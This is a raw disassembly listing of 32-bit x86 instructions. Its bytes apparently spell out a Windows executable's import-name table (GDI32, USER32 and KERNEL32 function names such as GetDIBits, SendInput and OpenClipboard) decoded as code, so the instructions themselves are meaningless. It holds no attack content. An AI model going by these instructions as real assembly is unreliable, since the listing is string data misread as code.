  41de61:	je     0x41dec8
  41de63:	ins    DWORD PTR es:[edi],dx
  41de64:	push   esp
  41de65:	imul   ebp,DWORD PTR [ebp+0x65],0x69466f54
  41de6c:	ins    BYTE PTR es:[edi],dx
  41de6d:	gs push esp
  41de6f:	imul   ebp,DWORD PTR [ebp+0x65],0x32b0000
  41de76:	dec    ebp
  41de77:	outs   dx,DWORD PTR ds:[esi]
  41de78:	jbe    0x41dedf
  41de7a:	inc    esi
  41de7b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xc5004178
  41de83:	add    al,0x6c
  41de85:	jae    0x41defb
  41de87:	jb     0x41deec
  41de89:	ins    DWORD PTR es:[edi],dx
  41de8a:	jo     0x41def5
  41de8c:	inc    ecx
  41de8d:	add    BYTE PTR [ecx+0x2],cl
  41de90:	inc    edi
  41de91:	gs je  0x41dee7
  41de94:	je     0x41df08
  41de96:	imul   ebp,DWORD PTR [esi+0x67],0x65707954
  41de9d:	inc    ebp
  41de9e:	js     0x41def7
  41dea0:	add    BYTE PTR [eax],al
  41dea2:	fld    QWORD PTR [eax]
  41dea4:	inc    ebx
  41dea5:	jb     0x41df0c
  41dea7:	popa   
  41dea8:	je     0x41df0f
  41deaa:	dec    ebp
  41deab:	jne    0x41df21
  41dead:	gs js  0x41def1
  41deb0:	add    BYTE PTR [eax],al
  41deb2:	dec    ebx
  41deb3:	inc    ebp
  41deb4:	push   edx
  41deb5:	dec    esi
  41deb6:	inc    ebp
  41deb7:	dec    esp
  41deb8:	xor    esi,DWORD PTR [edx]
  41deba:	cs fs ins BYTE PTR es:[edi],dx
  41debd:	ins    BYTE PTR es:[edi],dx
  41debe:	add    BYTE PTR [eax],al
  41dec0:	jno    0x41dec3
  41dec2:	inc    edi
  41dec3:	gs je  0x41df18
  41dec6:	dec    edi
  41dec7:	push   eax
  41dec8:	xor    al,BYTE PTR [eax]
  41deca:	mov    cl,0x0
  41decc:	inc    esp
  41decd:	push   eax
  41dece:	je     0x41df3f
  41ded0:	dec    esp
  41ded1:	push   eax
  41ded2:	add    BYTE PTR [eax],al
  41ded4:	fld    QWORD PTR [ecx]
  41ded6:	push   ebx
  41ded7:	gs je  0x41df1e
  41deda:	dec    ecx
  41dedb:	inc    edx
  41dedc:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x6e4500c5
  41dee4:	jne    0x41df53
  41dee6:	inc    esi
  41dee7:	outs   dx,DWORD PTR ds:[esi]
  41dee8:	outs   dx,BYTE PTR ds:[esi]
  41dee9:	je     0x41df31
  41deeb:	popa   
  41deec:	ins    DWORD PTR es:[edi],dx
  41deed:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0xa2005773
  41def5:	add    BYTE PTR [ebx+0x72],al
  41def8:	gs popa 
  41defa:	je     0x41df61
  41defc:	dec    ecx
  41defd:	inc    ebx
  41defe:	push   edi
  41deff:	add    BYTE PTR [ecx+0x1],bh
  41df02:	inc    edi
  41df03:	gs je  0x41df59
  41df06:	jns    0x41df7b
  41df08:	je     0x41df6f
  41df0a:	ins    DWORD PTR es:[edi],dx
  41df0b:	push   eax
  41df0c:	popa   
  41df0d:	ins    BYTE PTR es:[edi],dx
  41df0e:	gs je  0x41df85
  41df11:	gs inc ebp
  41df13:	outs   dx,BYTE PTR ds:[esi]
  41df14:	je     0x41df88
  41df16:	imul   esp,DWORD PTR [ebp+0x73],0x4300ab00
  41df1d:	jb     0x41df84
  41df1f:	popa   
  41df20:	je     0x41df87
  41df22:	push   edx
  41df23:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41df28:	outs   dx,BYTE PTR ds:[esi]
  41df29:	add    BYTE PTR [edi+0x1],bl
  41df2c:	inc    edi
  41df2d:	gs je  0x41df7d
  41df30:	popa   
  41df31:	jo     0x41df80
  41df33:	outs   dx,DWORD PTR ds:[esi]
  41df34:	fs add BYTE PTR gs:[eax],al
  41df38:	lahf   
  41df39:	add    BYTE PTR [ebx+0x72],al
  41df3c:	gs popa 
  41df3e:	je     0x41dfa5
  41df40:	dec    eax
  41df41:	popa   
  41df42:	ins    BYTE PTR es:[edi],dx
  41df43:	data16 je 0x41dfb5
  41df46:	outs   dx,BYTE PTR ds:[esi]
  41df47:	gs push eax
  41df49:	popa   
  41df4a:	ins    BYTE PTR es:[edi],dx
  41df4b:	gs je  0x41dfc2
  41df4e:	gs add dh,ch
  41df51:	add    DWORD PTR [ebx+0x65],edx
  41df54:	je     0x41dfa6
  41df56:	popa   
  41df57:	ins    BYTE PTR es:[edi],dx
  41df58:	gs je  0x41dfcf
  41df5b:	gs inc ebp
  41df5d:	outs   dx,BYTE PTR ds:[esi]
  41df5e:	je     0x41dfd2
  41df60:	imul   esp,DWORD PTR [ebp+0x73],0x43009400
  41df67:	jb     0x41dfce
  41df69:	popa   
  41df6a:	je     0x41dfd1
  41df6c:	inc    esp
  41df6d:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41df74:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  41df78:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xd50070
  41df80:	inc    ebp
  41df81:	js     0x41dff7
  41df83:	push   esp
  41df84:	gs js  0x41dffb
  41df87:	dec    edi
  41df88:	jne    0x41dffe
  41df8a:	push   edi
  41df8b:	add    BYTE PTR [edx+eax*1],cl
  41df8e:	push   esp
  41df8f:	gs js  0x41e006
  41df92:	dec    edi
  41df93:	jne    0x41e009
  41df95:	push   edi
  41df96:	add    BYTE PTR [eax],al
  41df98:	dec    ebx
  41df99:	add    DWORD PTR [edi+0x65],eax
  41df9c:	je     0x41dfe4
  41df9e:	outs   dx,DWORD PTR ds:[esi]
  41df9f:	outs   dx,BYTE PTR ds:[esi]
  41dfa0:	je     0x41dfe6
  41dfa2:	popa   
  41dfa3:	je     0x41e006
  41dfa5:	add    BYTE PTR [edi],bh
  41dfa7:	add    DWORD PTR [edi+0x65],eax
  41dfaa:	je     0x41dff0
  41dfac:	dec    ecx
  41dfad:	inc    edx
  41dfae:	inc    ebx
  41dfaf:	outs   dx,DWORD PTR ds:[esi]
  41dfb0:	ins    BYTE PTR es:[edi],dx
  41dfb1:	outs   dx,DWORD PTR ds:[esi]
  41dfb2:	jb     0x41e008
  41dfb4:	popa   
  41dfb5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41dfb9:	add    BYTE PTR [ecx+eax*1+0x796c6f50],dh
  41dfc0:	ins    BYTE PTR es:[edi],dx
  41dfc1:	imul   ebp,DWORD PTR [esi+0x65],0x1890000
  41dfc8:	inc    edi
  41dfc9:	gs je  0x41e020
  41dfcc:	gs js  0x41e043
  41dfcf:	inc    esi
  41dfd0:	popa   
  41dfd1:	arpl   WORD PTR [ebp+0x57],sp
  41dfd4:	add    BYTE PTR [eax],al
  41dfd6:	jnp    0x41dfd9
  41dfd8:	inc    edi
  41dfd9:	gs je  0x41e030
  41dfdc:	gs js  0x41e053
  41dfdf:	inc    ecx
  41dfe0:	ins    BYTE PTR es:[edi],dx
  41dfe1:	imul   esp,DWORD PTR [edi+0x6e],0x890000
  41dfe8:	inc    ebx
  41dfe9:	jb     0x41e050
  41dfeb:	popa   
  41dfec:	je     0x41e053
  41dfee:	inc    edx
  41dfef:	jb     0x41e066
  41dff1:	jae    0x41e05b
  41dff3:	dec    ecx
  41dff4:	outs   dx,BYTE PTR ds:[esi]
  41dff5:	imul   esi,DWORD PTR fs:[edx+0x65],0x24007463
  41dffd:	add    DWORD PTR [edi+0x65],eax
  41e000:	je     0x41e044
  41e002:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  41e006:	add    BYTE PTR gs:[ecx+eax*1+0x47],bl
  41e00b:	gs je  0x41e05a
  41e00e:	popa   
  41e00f:	jns    0x41e080
  41e011:	jne    0x41e087
  41e013:	add    BYTE PTR [eax+0x65724300],dh
  41e019:	popa   
  41e01a:	je     0x41e081
  41e01c:	push   ebx
  41e01d:	outs   dx,DWORD PTR ds:[esi]
  41e01e:	ins    BYTE PTR es:[edi],dx
  41e01f:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  41e027:	add    ah,al
  41e029:	add    BYTE PTR [ebp+0x6e],al
  41e02c:	jne    0x41e09b
  41e02e:	inc    esi
  41e02f:	outs   dx,DWORD PTR ds:[esi]
  41e030:	outs   dx,BYTE PTR ds:[esi]
  41e031:	je     0x41e079
  41e033:	popa   
  41e034:	ins    DWORD PTR es:[edi],dx
  41e035:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  41e03d:	add    BYTE PTR [eax+0x65724300],cl
  41e043:	popa   
  41e044:	je     0x41e0ab
  41e046:	inc    edx
  41e047:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  41e04f:	imul   esi,DWORD PTR [edx+0x65],0x7463
  41e056:	xchg   DWORD PTR [eax],eax
  41e058:	inc    ebx
  41e059:	jb     0x41e0c0
  41e05b:	popa   
  41e05c:	je     0x41e0c3
  41e05e:	inc    edx
  41e05f:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa7000070
  41e067:	add    BYTE PTR [ebx+0x72],al
  41e06a:	gs popa 
  41e06c:	je     0x41e0d3
  41e06e:	push   eax
  41e06f:	outs   dx,BYTE PTR gs:[esi]
  41e071:	add    BYTE PTR [edx+0x65724300],dl
  41e077:	popa   
  41e078:	je     0x41e0df
  41e07a:	inc    esp
  41e07b:	dec    ecx
  41e07c:	inc    edx
  41e07d:	push   ebx
  41e07e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41e083:	outs   dx,BYTE PTR ds:[esi]
  41e084:	add    BYTE PTR [eax],al
  41e086:	add    DWORD PTR [eax],0x626d6f43
  41e08c:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  41e093:	add    BYTE PTR [esi+0x1],ah
  41e096:	inc    edi
  41e097:	gs je  0x41e0e8
  41e09a:	gs popa 
  41e09c:	jb     0x41e103
  41e09e:	jae    0x41e114
  41e0a0:	push   eax
  41e0a1:	popa   
  41e0a2:	ins    BYTE PTR es:[edi],dx
  41e0a3:	gs je  0x41e11a
  41e0a6:	gs dec ecx
  41e0a8:	outs   dx,BYTE PTR ds:[esi]
  41e0a9:	fs gs js 0x41e0ad
  41e0ad:	add    BYTE PTR [eax+eax*1+0x696c6c45],bh
  41e0b4:	jo     0x41e129
  41e0b6:	add    BYTE PTR gs:[edx+0x74654701],cl
  41e0bd:	push   esp
  41e0be:	gs js  0x41e135
  41e0c1:	dec    ebp
  41e0c2:	gs je  0x41e137
  41e0c5:	imul   esp,DWORD PTR [ebx+0x73],0x1b80041
  41e0cc:	push   edx
  41e0cd:	gs popa 
  41e0cf:	ins    BYTE PTR es:[edi],dx
  41e0d0:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  41e0d7:	je     0x41e14d
  41e0d9:	add    BYTE PTR gs:[eax],al
  41e0dc:	lar    edx,WORD PTR [ebp+0x6e]
  41e0e0:	jb     0x41e147
  41e0e2:	popa   
  41e0e3:	ins    BYTE PTR es:[edi],dx
  41e0e4:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  41e0eb:	arpl   WORD PTR [eax+eax*1-0x6],si
  41e0ef:	add    DWORD PTR [ebx+0x65],edx
  41e0f2:	je     0x41e148
  41e0f4:	gs js  0x41e16b
  41e0f7:	inc    ebx
  41e0f8:	outs   dx,DWORD PTR ds:[esi]
  41e0f9:	ins    BYTE PTR es:[edi],dx
  41e0fa:	outs   dx,DWORD PTR ds:[esi]
  41e0fb:	jb     0x41e0fd
  41e0fd:	add    BYTE PTR [esi+0x646e4500],bh
  41e103:	inc    esp
  41e104:	outs   dx,DWORD PTR ds:[esi]
  41e105:	arpl   WORD PTR [eax],ax
  41e107:	add    BYTE PTR [edx+0x1],bh
  41e10a:	inc    edi
  41e10b:	gs je  0x41e161
  41e10e:	jns    0x41e183
  41e110:	je     0x41e177
  41e112:	ins    DWORD PTR es:[edi],dx
  41e113:	push   eax
  41e114:	popa   
  41e115:	ins    BYTE PTR es:[edi],dx
  41e116:	gs je  0x41e18d
  41e119:	gs push ebp
  41e11b:	jae    0x41e182
  41e11d:	add    dh,bl
  41e11f:	add    DWORD PTR [ebx+0x65],edx
  41e122:	je     0x41e168
  41e124:	dec    ecx
  41e125:	inc    edx
  41e126:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  41e12e:	imul   esp,DWORD PTR [ebx+0x65],0x5301dc00
  41e135:	gs je  0x41e17c
  41e138:	dec    ecx
  41e139:	inc    edx
  41e13a:	inc    ebx
  41e13b:	outs   dx,DWORD PTR ds:[esi]
  41e13c:	ins    BYTE PTR es:[edi],dx
  41e13d:	outs   dx,DWORD PTR ds:[esi]
  41e13e:	jb     0x41e194
  41e140:	popa   
  41e141:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e145:	add    al,dl
  41e147:	add    DWORD PTR [ebx+0x65],edx
  41e14a:	je     0x41e18d
  41e14c:	bound  ebp,QWORD PTR [edi+0x72]
  41e14f:	je     0x41e1a1
  41e151:	jb     0x41e1c2
  41e153:	arpl   WORD PTR [eax],ax
  41e155:	add    ah,al
  41e157:	add    DWORD PTR [edx+0x65],edx
  41e15a:	jae    0x41e1c5
  41e15c:	jp     0x41e1c3
  41e15e:	push   eax
  41e15f:	popa   
  41e160:	ins    BYTE PTR es:[edi],dx
  41e161:	gs je  0x41e1d8
  41e164:	add    BYTE PTR gs:[edx+eax*1],dl
  41e168:	push   edi
  41e169:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  41e171:	add    dh,cl
  41e173:	add    BYTE PTR [ebp+0x78],al
  41e176:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  41e17a:	gs inc ebx
  41e17c:	ins    BYTE PTR es:[edi],dx
  41e17d:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41e184:	xchg   esi,eax
  41e185:	add    BYTE PTR [ebx+0x72],al
  41e188:	gs popa 
  41e18a:	je     0x41e1f1
  41e18c:	inc    ebp
  41e18d:	ins    BYTE PTR es:[edi],dx
  41e18e:	ins    BYTE PTR es:[edi],dx
  41e18f:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  41e196:	outs   dx,BYTE PTR ds:[esi]
  41e197:	dec    ecx
  41e198:	outs   dx,BYTE PTR ds:[esi]
  41e199:	imul   esi,DWORD PTR fs:[edx+0x65],0xc1007463
  41e1a1:	add    DWORD PTR [edx+0x65],edx
  41e1a4:	ins    DWORD PTR es:[edi],dx
  41e1a5:	outs   dx,DWORD PTR ds:[esi]
  41e1a6:	jbe    0x41e20d
  41e1a8:	inc    esi
  41e1a9:	outs   dx,DWORD PTR ds:[esi]
  41e1aa:	outs   dx,BYTE PTR ds:[esi]
  41e1ab:	je     0x41e1ff
  41e1ad:	gs jae 0x41e21f
  41e1b0:	jne    0x41e224
  41e1b2:	arpl   WORD PTR [ebp+0x57],sp
  41e1b5:	add    BYTE PTR [edi+0x65724300],cl
  41e1bb:	popa   
  41e1bc:	je     0x41e223
  41e1be:	inc    esp
  41e1bf:	inc    ebx
  41e1c0:	push   edi
  41e1c1:	add    BYTE PTR [edx+0x65724300],ch
  41e1c7:	popa   
  41e1c8:	je     0x41e22f
  41e1ca:	push   eax
  41e1cb:	outs   dx,DWORD PTR ds:[esi]
  41e1cc:	ins    BYTE PTR es:[edi],dx
  41e1cd:	jns    0x41e236
  41e1cf:	outs   dx,DWORD PTR ds:[esi]
  41e1d0:	outs   dx,BYTE PTR ds:[esi]
  41e1d1:	push   edx
  41e1d2:	outs   dx,BYTE PTR ds:[si]
  41e1d4:	add    BYTE PTR [eax],al
  41e1d6:	mov    es,WORD PTR [ecx]
  41e1d8:	inc    edi
  41e1d9:	gs je  0x41e232
  41e1dc:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41e1e3:	dec    edi
  41e1e4:	jb     0x41e24d
  41e1e6:	inc    ebp
  41e1e7:	js     0x41e1e9
  41e1e9:	add    BYTE PTR [edi+0x44],al
  41e1ec:	dec    ecx
  41e1ed:	xor    esi,DWORD PTR [edx]
  41e1ef:	cs fs ins BYTE PTR es:[edi],dx
  41e1f2:	ins    BYTE PTR es:[edi],dx
  41e1f3:	add    BYTE PTR [eax+eax*1+0x74736544],dl
  41e1fa:	jb     0x41e26b
  41e1fc:	jns    0x41e241
  41e1fe:	popa   
  41e1ff:	jb     0x41e266
  41e201:	je     0x41e203
  41e203:	add    BYTE PTR [eax+0x61724400],dh
  41e209:	ja     0x41e251
  41e20b:	outs   dx,DWORD PTR ds:[esi]
  41e20c:	arpl   WORD PTR [ebp+0x73],si
  41e20f:	push   edx
  41e210:	arpl   WORD PTR gs:[eax+eax*1-0x4e],si
  41e215:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e219:	fs dec ecx
  41e21b:	ins    DWORD PTR es:[edi],dx
  41e21c:	popa   
  41e21d:	addr16 gs push edi
  41e220:	add    BYTE PTR [eax],al
  41e222:	mov    eax,0x69615702
  41e227:	je     0x41e276
  41e229:	gs jae 0x41e29f
  41e22c:	popa   
  41e22d:	add    BYTE PTR gs:[bx+0x4400],dl
  41e233:	gs jae 0x41e2aa
  41e236:	jb     0x41e2a7
  41e238:	jns    0x41e287
  41e23a:	outs   dx,BYTE PTR gs:[esi]
  41e23c:	jne    0x41e23e
  41e23e:	stos   DWORD PTR es:[edi],eax
  41e23f:	add    BYTE PTR [edx+esi*2+0x61],al
  41e243:	ja     0x41e286
  41e245:	outs   dx,BYTE PTR ds:[esi]
  41e246:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  41e24d:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  41e252:	mov    BYTE PTR [eax],al
  41e254:	inc    esp
  41e255:	gs inc sp
  41e258:	ins    BYTE PTR es:[edi],dx
  41e259:	addr16 push eax
  41e25b:	jb     0x41e2cc
  41e25d:	arpl   WORD PTR [edi+0x0],dx
  41e260:	add    DWORD PTR [eax],eax
  41e262:	inc    ecx
  41e263:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  41e267:	popa   
  41e268:	je     0x41e2cf
  41e26a:	dec    ebx
  41e26b:	gs jns 0x41e2d0
  41e26e:	outs   dx,DWORD PTR ds:[esi]
  41e26f:	popa   
  41e270:	jb     0x41e2d6
  41e272:	dec    esp
  41e273:	popa   
  41e274:	jns    0x41e2e5
  41e276:	jne    0x41e2ec
  41e278:	add    BYTE PTR [eax],al
  41e27a:	data16 add dl,BYTE PTR [ebx+0x65]
  41e27e:	je     0x41e2d4
  41e280:	imul   ebp,DWORD PTR [ebp+0x65],0x75000072
  41e287:	add    DWORD PTR [edi+0x65],eax
  41e28a:	je     0x41e2e3
  41e28c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e293:	js     0x41e309
  41e295:	inc    ecx
  41e296:	add    BYTE PTR [eax],al
  41e298:	and    eax,0x6e655302
  41e29d:	fs dec ecx
  41e29f:	outs   dx,BYTE PTR ds:[esi]
  41e2a0:	jo     0x41e317
  41e2a2:	je     0x41e2a4
  41e2a4:	mov    edi,0x636f4c01
  41e2a9:	imul   edx,DWORD PTR [edi+0x69],0x6e
  41e2ad:	outs   dx,DWORD PTR fs:[esi]
  41e2af:	ja     0x41e306
  41e2b1:	jo     0x41e317
  41e2b3:	popa   
  41e2b4:	je     0x41e31b
  41e2b6:	add    BYTE PTR [eax],al
  41e2b8:	mov    bh,0x2
  41e2ba:	push   edi
  41e2bb:	popa   
  41e2bc:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  41e2c4:	jne    0x41e33a
  41e2c6:	dec    ecx
  41e2c7:	fs ins BYTE PTR es:[edi],dx
  41e2c9:	add    BYTE PTR gs:[eax],al
  41e2cc:	dec    eax
  41e2cd:	add    dl,BYTE PTR [ebx+0x65]
  41e2d0:	je     0x41e31f
  41e2d2:	outs   dx,BYTE PTR gs:[esi]
  41e2d4:	jne    0x41e2d6
  41e2d6:	sub    eax,DWORD PTR [ecx]
  41e2d8:	inc    edi
  41e2d9:	gs je  0x41e329
  41e2dc:	outs   dx,BYTE PTR gs:[esi]
  41e2de:	jne    0x41e2e0
  41e2e0:	adc    eax,DWORD PTR [edx]
  41e2e2:	push   edx
  41e2e3:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  41e2ec:	outs   dx,BYTE PTR ds:[esi]
  41e2ed:	outs   dx,DWORD PTR fs:[esi]
  41e2ef:	ja     0x41e33e
  41e2f1:	gs jae 0x41e367
  41e2f4:	popa   
  41e2f5:	addr16 gs push edi
  41e2f8:	add    BYTE PTR [eax],al
  41e2fa:	push   ebp
  41e2fb:	add    DWORD PTR [edi+0x65],eax
  41e2fe:	je     0x41e353
  41e300:	arpl   WORD PTR [edx+0x6f],si
  41e303:	ins    BYTE PTR es:[edi],dx
  41e304:	ins    BYTE PTR es:[edi],dx
  41e305:	push   eax
  41e306:	outs   dx,DWORD PTR ds:[esi]
  41e307:	jae    0x41e309
  41e309:	add    bh,cl
  41e30b:	add    DWORD PTR [ebp+0x65],ecx
  41e30e:	jae    0x41e383
  41e310:	popa   
  41e311:	addr16 gs inc edx
  41e314:	outs   dx,DWORD PTR ds:[esi]
  41e315:	js     0x41e35c
  41e317:	js     0x41e35a
  41e319:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  41e320:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x65470164
  41e328:	je     0x41e37f
  41e32a:	jo     0x41e390
  41e32c:	popa   
  41e32d:	je     0x41e394
  41e32f:	push   edx
  41e330:	outs   dx,BYTE PTR ds:[si]
  41e332:	add    BYTE PTR [eax],al
  41e334:	mov    dh,0x1
  41e336:	dec    esp
  41e337:	outs   dx,DWORD PTR ds:[esi]
  41e338:	popa   
  41e339:	fs dec ebp
  41e33b:	outs   dx,BYTE PTR gs:[esi]
  41e33d:	jne    0x41e380
  41e33f:	add    BYTE PTR [ecx],cl
  41e341:	add    BYTE PTR [ecx+0x70],al
  41e344:	jo     0x41e3ab
  41e346:	outs   dx,BYTE PTR ds:[esi]
  41e347:	fs dec ebp
  41e349:	outs   dx,BYTE PTR gs:[esi]
  41e34b:	jne    0x41e3a4
  41e34d:	add    BYTE PTR [ebp+0x0],bl
  41e350:	inc    ebx
  41e351:	jb     0x41e3b8
  41e353:	popa   
  41e354:	je     0x41e3bb
  41e356:	dec    ecx
  41e357:	arpl   WORD PTR [edi+0x6e],bp
  41e35a:	dec    ecx
  41e35b:	outs   dx,BYTE PTR ds:[esi]
  41e35c:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  41e364:	ins    BYTE PTR es:[edi],dx
  41e365:	add    DWORD PTR [edi+0x65],eax
  41e368:	je     0x41e3c1
  41e36a:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e371:	outs   dx,BYTE PTR ds:[esi]
  41e372:	addr16 inc ecx
  41e374:	add    BYTE PTR [eax],al
  41e376:	ja     0x41e379
  41e378:	inc    edi
  41e379:	gs je  0x41e3d3
  41e37c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e383:	js     0x41e3f9
  41e385:	dec    esp
  41e386:	outs   dx,BYTE PTR gs:[esi]
  41e388:	addr16 je 0x41e3f3
  41e38b:	push   edi
  41e38c:	add    BYTE PTR [eax],al
  41e38e:	cmp    eax,0x65684300
  41e393:	arpl   WORD PTR [ebx+0x52],bp
  41e396:	popa   
  41e397:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  41e39f:	outs   dx,BYTE PTR ds:[esi]
  41e3a0:	add    BYTE PTR [eax],al
  41e3a2:	add    BYTE PTR [ecx],0x49
  41e3a5:	outs   dx,BYTE PTR ds:[esi]
  41e3a6:	data16 ins BYTE PTR es:[edi],dx
  41e3a8:	popa   
  41e3a9:	je     0x41e410
  41e3ab:	push   edx
  41e3ac:	arpl   WORD PTR gs:[eax+eax*1-0x70],si
  41e3b1:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41e3b5:	arpl   WORD PTR [ebx+0x50],bp
  41e3b8:	outs   dx,DWORD PTR ds:[esi]
  41e3b9:	jo     0x41e430
  41e3bb:	jo     0x41e40a
  41e3bd:	outs   dx,BYTE PTR gs:[esi]
  41e3bf:	jne    0x41e3c1
  41e3c1:	add    BYTE PTR ds:0x6c655202,dl
  41e3c7:	gs popa 
  41e3c9:	jae    0x41e430
  41e3cb:	inc    esp
  41e3cc:	inc    ebx
  41e3cd:	add    BYTE PTR [ebx],ch
  41e3cf:	add    dl,BYTE PTR [ebx+0x65]
  41e3d2:	outs   dx,BYTE PTR ds:[esi]
  41e3d3:	fs dec ebp
  41e3d5:	gs jae 0x41e44b
  41e3d8:	popa   
  41e3d9:	addr16 gs push edi
  41e3dc:	add    BYTE PTR [eax],al
  41e3de:	fild   DWORD PTR [ecx]
  41e3e0:	dec    ebp
  41e3e1:	outs   dx,DWORD PTR ds:[esi]
  41e3e2:	jbe    0x41e449
  41e3e4:	push   edi
  41e3e5:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e3ec:	mov    dl,0x0
  41e3ee:	inc    esp
  41e3ef:	jb     0x41e452
  41e3f1:	ja     0x41e439
  41e3f3:	jb     0x41e456
  41e3f5:	ins    DWORD PTR es:[edi],dx
  41e3f6:	gs inc ebx
  41e3f8:	outs   dx,DWORD PTR ds:[esi]
  41e3f9:	outs   dx,BYTE PTR ds:[esi]
  41e3fa:	je     0x41e46e
  41e3fc:	outs   dx,DWORD PTR ds:[esi]
  41e3fd:	ins    BYTE PTR es:[edi],dx
  41e3fe:	add    BYTE PTR [eax],al
  41e400:	stos   DWORD PTR es:[edi],eax
  41e401:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e405:	fs inc ebx
  41e407:	jne    0x41e47b
  41e409:	jae    0x41e47a
  41e40b:	jb     0x41e44e
  41e40d:	add    BYTE PTR [eax+0x2],ch
  41e410:	push   ebx
  41e411:	gs je  0x41e469
  41e414:	jae    0x41e47b
  41e416:	jb     0x41e467
  41e418:	bound  ebp,QWORD PTR [edx+0x65]
  41e41b:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  41e41f:	outs   dx,WORD PTR ds:[esi]
  41e421:	jb     0x41e490
  41e423:	popa   
  41e424:	je     0x41e48f
  41e426:	outs   dx,DWORD PTR ds:[esi]
  41e427:	outs   dx,BYTE PTR ds:[esi]
  41e428:	push   edi
  41e429:	add    BYTE PTR [ecx+0x0],ah
  41e42c:	inc    ebx
  41e42d:	jb     0x41e494
  41e42f:	popa   
  41e430:	je     0x41e497
  41e432:	push   eax
  41e433:	outs   dx,DWORD PTR ds:[esi]
  41e434:	jo     0x41e4ab
  41e436:	jo     0x41e485
  41e438:	outs   dx,BYTE PTR gs:[esi]
  41e43a:	jne    0x41e43c
  41e43c:	xor    al,0x2
  41e43e:	push   ebx
  41e43f:	gs je  0x41e485
  41e442:	ins    BYTE PTR es:[edi],dx
  41e443:	popa   
  41e444:	jae    0x41e4b9
  41e446:	dec    esp
  41e447:	outs   dx,DWORD PTR ds:[esi]
  41e448:	outs   dx,BYTE PTR ds:[esi]
  41e449:	addr16 push edi
  41e44b:	add    BYTE PTR [ebx+0x0],ah
  41e44e:	inc    ebx
  41e44f:	jb     0x41e4b6
  41e451:	popa   
  41e452:	je     0x41e4b9
  41e454:	push   edi
  41e455:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e45c:	push   edi
  41e45d:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  41e464:	outs   dx,DWORD PTR ds:[esi]
  41e465:	outs   dx,BYTE PTR ds:[esi]
  41e466:	imul   esp,DWORD PTR [ebx+0x0],0x49018500
  41e46d:	outs   dx,BYTE PTR ds:[esi]
  41e46e:	jae    0x41e4d5
  41e470:	jb     0x41e4e6
  41e472:	dec    ebp
  41e473:	outs   dx,BYTE PTR gs:[esi]
  41e475:	jne    0x41e4c0
  41e477:	je     0x41e4de
  41e479:	ins    DWORD PTR es:[edi],dx
  41e47a:	push   edi
  41e47b:	add    ah,ah
  41e47d:	add    DWORD PTR [edi+0x66],ecx
  41e480:	data16 jae 0x41e4e8
  41e483:	je     0x41e4d7
  41e485:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e48a:	scas   al,BYTE PTR es:[edi]
  41e48b:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e48f:	fs inc ebx
  41e491:	jne    0x41e505
  41e493:	jae    0x41e504
  41e495:	jb     0x41e4ee
  41e497:	add    BYTE PTR [ebx],al
  41e499:	add    BYTE PTR [ecx+0x64],al
  41e49c:	push   0x75
  41e49e:	jae    0x41e514
  41e4a0:	push   edi
  41e4a1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  41e4a8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  41e4ac:	add    BYTE PTR [eax],al
  41e4ae:	js     0x41e4b1
  41e4b0:	inc    edi
  41e4b1:	gs je  0x41e50b
  41e4b4:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e4bb:	js     0x41e531
  41e4bd:	push   edi
  41e4be:	add    BYTE PTR [eax],al
  41e4c0:	push   cs
  41e4c1:	add    DWORD PTR [edi+0x65],eax
  41e4c4:	je     0x41e50a
  41e4c6:	ins    BYTE PTR es:[edi],dx
  41e4c7:	addr16 inc ebx
  41e4c9:	je     0x41e53d
  41e4cb:	ins    BYTE PTR es:[edi],dx
  41e4cc:	dec    ecx
  41e4cd:	inc    esp
  41e4ce:	add    BYTE PTR [eax],al
  41e4d0:	mov    esp,0x6e695702
  41e4d5:	outs   dx,DWORD PTR fs:[esi]
  41e4d7:	ja     0x41e51f
  41e4d9:	jb     0x41e54a
